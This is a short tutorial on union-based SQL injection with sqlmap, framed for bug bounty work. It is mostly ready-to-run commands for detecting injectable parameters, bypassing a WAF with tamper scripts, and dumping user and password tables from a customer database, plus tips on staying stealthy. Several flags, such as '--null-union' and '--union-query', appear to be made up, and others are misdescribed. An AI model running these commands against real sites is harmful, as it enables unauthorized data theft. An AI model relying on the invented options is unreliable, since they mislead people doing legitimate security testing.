# Union-Based SQL Injection Attacks with SQLMap

## Understanding Union-Based SQLi

Union-based SQL injection is a technique that leverages the SQL `UNION` operator to combine results from the original query with results from injected SQL statements. This allows attackers to extract data from other tables/databases.

## Basic Union-Based Attack with SQLMap

### 1. Identify Vulnerable Parameter
```
sqlmap -u "http://example.com/page.php?id=1" --batch --random-agent
```

### 2. Confirm Union-Based Vulnerability
```
sqlmap -u "http://example.com/page.php?id=1" --technique=U --banner
```
- `--technique=U` forces union-based technique
- `--banner` retrieves DBMS banner to confirm working injection

### 3. Determine Number of Columns
automatically:
```sh
sqlmap -u "http://example.com/page?category=1" --technique=U --columns
```

SQLMap does this automatically, but you can manually specify:
```sh
sqlmap -u "http://example.com/page.php?id=1" --technique=U --union-cols=5 --columns
```

### 4. Find Displayable Columns
```
sqlmap -u "http://example.com/page.php?id=1" --union-char=123 --dbs
```
- `--union-char` specifies the value to use in union queries

## Advanced Union-Based Techniques

### Extracting Specific Data
```
sqlmap -u "http://example.com/page.php?id=1" --union-from=users -D database_name -T users --dump
```

### Using Union with WAF Bypass
```
sqlmap -u "http://example.com/page.php?id=1" --technique=U --tamper=space2comment,randomcase --hex
```

### Custom Union Query
```
sqlmap -u "http://example.com/page.php?id=1" --union-query="SELECT 1,username,password FROM users"
```

## Important Flags for Union Attacks

- `--union-cols`: Specify number of columns
- `--union-char`: Character to use in UNION queries
- `--union-from`: Table to use in FROM part of UNION query
- `--null-union`: Use NULL in UNION queries
- `--hex`: Use hex conversion for data retrieval

## Bug Bounty Tips for Union-Based Attacks

1. **Test all parameters** - Not just numeric IDs, but also string parameters
2. **Check for second-order injection** - Test forms that store data
3. **Combine techniques** - Use union with boolean-based for better results
4. **Be stealthy** - Use delays and random agents
5. **Document thoroughly** - Capture all steps for your report

## Example Workflow

1. Initial detection:
```
sqlmap -u "http://example.com/product?id=1" --technique=U --banner
```

2. Enumerate databases:
```
sqlmap -u "http://example.com/product?id=1" --technique=U --dbs
```

3. Target specific database:
```
sqlmap -u "http://example.com/product?id=1" --technique=U -D customer_db --tables
```

4. Dump sensitive data:
```
sqlmap -u "http://example.com/product?id=1" --technique=U -D customer_db -T users --dump
```

Remember to always test ethically and only on authorized targets!